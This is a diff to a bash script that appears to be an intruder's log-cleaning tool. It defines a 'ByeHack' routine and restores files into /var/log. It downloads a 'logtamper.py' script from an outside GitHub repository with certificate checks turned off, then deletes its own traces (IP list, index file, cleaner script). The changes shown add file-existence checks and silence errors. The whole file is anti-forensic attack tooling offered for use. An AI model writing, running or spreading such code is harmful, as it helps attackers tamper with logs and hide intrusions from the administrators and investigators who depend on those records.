@@ -14,15 +14,17 @@ function gglog {  #_fdsagadsfasdgadsgsss
     echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}"  #_fdsagadsfasdgadsgsss
 }  #_fdsagadsfasdgadsgsss
 function _resume {  #_fdsagadsfasdgadsgsss
-  for i in $(cat $index_f);  #_fdsagadsfasdgadsgsss
-  do  #_fdsagadsfasdgadsgsss
-    if [ -f $1 ];then  #_fdsagadsfasdgadsgsss
-      mv $i /var/log/  2>/dev/null;  #_fdsagadsfasdgadsgsss
-      if [ $? -eq 0 ];then  #_fdsagadsfasdgadsgsss
-	 gglog $i " [resume]"  #_fdsagadsfasdgadsgsss
+  if [ -f $index_f ];then #_fdsagadsfasdgadsgsss
+    for i in $(cat $index_f);  #_fdsagadsfasdgadsgsss
+    do  #_fdsagadsfasdgadsgsss
+      if [ -f $1 ];then  #_fdsagadsfasdgadsgsss
+        mv $i /var/log/  2>/dev/null;  #_fdsagadsfasdgadsgsss
+        if [ $? -eq 0 ];then  #_fdsagadsfasdgadsgsss
+	   gglog $i " [resume]"  #_fdsagadsfasdgadsgsss
+        fi   #_fdsagadsfasdgadsgsss
       fi   #_fdsagadsfasdgadsgsss
-    fi   #_fdsagadsfasdgadsgsss
-  done  #_fdsagadsfasdgadsgsss
+    done  #_fdsagadsfasdgadsgsss
+  fi  #_fdsagadsfasdgadsgsss
 }  #_fdsagadsfasdgadsgsss
 if [ !  -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
     wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;  #_fdsagadsfasdgadsgsss
@@ -47,8 +49,8 @@ function ByeHack {    #_fdsagadsfasdgadsgsss
     fi  #_fdsagadsfasdgadsgsss
     CL    #_fdsagadsfasdgadsgsss
     _resume;    #_fdsagadsfasdgadsgsss
-    rm $my_ips;    #_fdsagadsfasdgadsgsss
-    rm $index_f;    #_fdsagadsfasdgadsgsss
-    rm $clear_shell;    #_fdsagadsfasdgadsgsss
+    rm $my_ips 2>/dev/null;    #_fdsagadsfasdgadsgsss
+    rm $index_f 2>/dev/null;    #_fdsagadsfasdgadsgsss
+    rm $clear_shell 2>/dev/null;    #_fdsagadsfasdgadsgsss
 }  #_fdsagadsfasdgadsgsss
 ByeHack;  #_fdsagadsfasdgadsgsss
